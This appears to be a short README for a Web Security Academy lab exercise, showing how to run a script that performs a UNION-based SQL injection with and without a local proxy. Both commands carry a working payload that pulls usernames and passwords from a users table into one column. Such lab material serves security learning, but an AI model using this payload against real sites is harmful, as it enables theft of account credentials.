# How to run script.py

### SQL injection UNION attack, retrieving multiple values in a single column

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,username|| '-' ||password FROM users--"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,username|| '-' ||password FROM users--" -p 127.0.0.1:8080`
